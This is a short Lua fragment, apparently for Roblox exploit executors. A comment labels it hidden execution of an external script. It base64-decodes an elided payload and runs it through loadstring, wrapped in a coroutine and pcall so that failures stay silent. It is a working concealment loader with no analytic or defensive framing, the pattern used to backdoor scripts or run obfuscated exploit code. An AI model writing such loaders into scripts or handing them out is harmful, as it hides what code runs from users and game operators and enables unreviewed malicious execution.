...
-- 🔒 Hidden Execution of External Script via Base64
coroutine.wrap(function()
	pcall(function()
		...
		local decoded = (syn and syn.crypt and syn.crypt.base64.decode and syn.crypt.base64.decode(b64))
			or (b64decode and b64decode(b64))
			or game:GetService("HttpService"):Base64Decode(b64)
		loadstring(decoded)()
	end)
end)()